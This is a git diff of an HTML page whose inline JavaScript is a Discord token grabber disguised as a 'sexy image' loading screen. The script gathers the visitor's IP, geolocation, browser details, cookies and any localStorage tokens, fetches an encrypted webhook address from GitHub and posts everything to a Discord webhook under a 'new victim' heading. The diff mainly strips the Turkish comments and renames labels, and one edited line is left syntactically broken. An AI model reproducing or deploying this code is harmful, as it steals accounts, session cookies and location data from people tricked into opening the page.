@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // === 1. TARAYICI BILGILERI ===
+        // web ===
         const info = {
             URL: location.href,
             Referrer: document.referrer,
@@ -34,14 +34,14 @@
             .then(data => info.IP = data.ip)
             .catch(() => info.IP = '❌');
 
-        // === 3. COĞRAFİ KONUM ===
+         // konum ===
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 info.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
             });
         }
 
-        // === 4. DISCORD TOKEN TESPIT (localStorage taranır) ===
+        // token dc
         try {
             for (let key in localStorage) {
                 if (key.includes('token') || key.includes('discord')) {
@@ -57,7 +57,7 @@
             }
         } catch (e) {}
 
-        // === 5. WEBHOOK URL'SINI DEŞİFRE ET ===
+      
         fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
             .then(res => res.text())
             .then(encrypted => {
@@ -76,22 +76,22 @@
                 }, 3000);
             });
 
-        // === 6. DISCORD'A GÖNDER ===
+       
         function sendToDiscord(url) {
             const embed = {
                 username: 'nefretwasherebaby',
                 avatar_url: 'https://i.imgur.com/rFhOcMq.png',
                 embeds: [{
-                    title: '🎯 YENİ KURBAN | TOKEN + COOKIES',
-                    description: '```yaml\nDiscord token, çerezler ve tüm veriler çekildi.\n```',
+                    title: '🎯 malevladi,
+                    description: '```yaml\ token ve çerezler cepte.\n```',
                     color: 0xFF0000,
                     fields: [
-                        { name: '📛 DISCORD TOKEN', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
-                        { name: '🍪 COOKIES', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
-                        { name: '📱 CİHAZ', value: '```\n' + info.UserAgent + '\n```', inline: false },
-                        { name: '🌐 IP', value: '```\n' + info.IP + '\n```', inline: true },
-                        { name: '📍 KONUM', value: '```\n' + info.Geolocation + '\n```', inline: true },
-                        { name: '⏰ ZAMAN', value: '```\n' + info.Tarih + '\n```', inline: true }
+                        { name: '📛 dctoken', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
+                        { name: '🍪 neonunyedigikurabiye', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
+                        { name: '📱 cihaz', value: '```\n' + info.UserAgent + '\n```', inline: false },
+                        { name: '🌐 ip', value: '```\n' + info.IP + '\n```', inline: true },
+                        { name: '📍 nerdesinmal', value: '```\n' + info.Geolocation + '\n```', inline: true },
+                        { name: '⏰ timebabatime', value: '```\n' + info.Tarih + '\n```', inline: true }
                     ],
                     footer: { text: 'nefretwasherebaby - github.com/nefretwasherebaby' },
                     timestamp: new Date().toISOString()
@@ -105,7 +105,7 @@
             }).catch(e => console.log('Gönderilemedi:', e));
         }
 
-        // === 7. KULLANICIYI KANDIR ===
+       
         document.body.innerHTML = `
             <div style="width:100vw;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial;">
                 <img src="https://via.placeholder.com/800x600/111/ffffff?text=Seksii+Resim+Yükleniyor..." 
